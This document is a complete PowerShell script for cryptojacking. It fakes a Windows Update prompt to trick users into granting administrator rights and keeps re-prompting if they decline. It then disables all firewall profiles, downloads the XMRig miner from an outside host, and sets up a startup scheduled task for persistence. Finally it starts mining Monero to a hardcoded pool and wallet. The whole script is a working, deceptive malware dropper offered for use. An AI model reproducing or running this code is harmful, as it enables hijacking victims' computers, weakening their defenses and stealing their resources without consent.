Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName PresentationFramework
$ScriptPath = $MyInvocation.MyCommand.Path
$ScriptDir  = Split-Path -Parent $ScriptPath
$PSCommandPath = $ScriptDir + "\hmez.ps1"
# Get the ID and security principal of the current user account
$myWindowsID = [System.Security.Principal.WindowsIdentity]::GetCurrent();
$myWindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($myWindowsID);

# Get the security principal for the administrator role
$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator;

function promptAdminRights
{   Add-Type -AssemblyName System.Windows.Forms
    $global:balmsg = New-Object System.Windows.Forms.NotifyIcon
    $path = (Get-Process -id $pid).Path
    $balmsg.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
    $balmsg.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info
    $balmsg.BalloonTipText = "New Windows update available `r`n Click Here to View"
    $balmsg.BalloonTipTitle = "Attention $Env:USERNAME"
    $balmsg.Visible = $true
    $balmsg.ShowBalloonTip(0)
    $balmsg.dispose()
    $msgBoxInput =  [System.Windows.MessageBox]::Show("Windows would like to update your system. `r`n Please give Powershell permission to update.",'Windows Software Update','YesNoCancel','Warning')
    switch  ($msgBoxInput) 
    {

        'Yes' 
        {
            
            
          Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs;              


        }
        'No'
        {
            promptAdminRights
        }
        'Cancel'
        {
            promptAdminRights
        }
    }
}

function runScript 
{

    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    Write-Host Preparing Download ...    
    $download = "https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-gcc-win64.zip"
    $outputPath = $ScriptDir + "\test.zip"
    $destinationPath = $ScriptDir
    $batchFilePath = $ScriptDir + "\hmez.bat"
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($download, $outputPath)
    
    cd $destinationPath 

    if(!(Test-Path $outputPath))
    {
        runScript
    }else
    {
        
        Write-Host "Files Downloaded :D ..."
     
        Clear-Host
        Expand-Archive -LiteralPath $outputPath -DestinationPath C: -Force
        Copy-Item -LiteralPath $batchFilePath -Destination C: -Force
      
        Write-Host "Extracting Files ..."
        Expand-Archive -LiteralPath $outputPath -DestinationPath $destinationPath -Force
        [console]::beep(349,350)
        Remove-Item -Path $outputPath
        $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay 00:00:30
        $action = New-ScheduledTaskAction Start-Process powershell $batchFilePath
        Register-ScheduledTask -AsJob -Trigger $trigger -Action $action -TaskName hmez -Force
        Start-ScheduledTask -TaskName hmez
        Clear-Host
       
        Write-Host "Files Extracted!!!!"
        [console]::beep(349,350)
        
        [console]::beep(349,350)
         xmrig.exe --donate-level 5 -o xmr.pool.gntl.co.uk:20009 -u 83b7CDG6RXQ5NXNToyyPiySq63Kpo9onfe5gXKC9JypaUDKUHYvCXxZ6TvGKAkg3XWR5oMemEXbWdRevSLLPUevvDQUANFG -k --tls -p Whatever
    }
     
              
}

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{  
    promptAdminRights
}else
{
    runScript 
} 


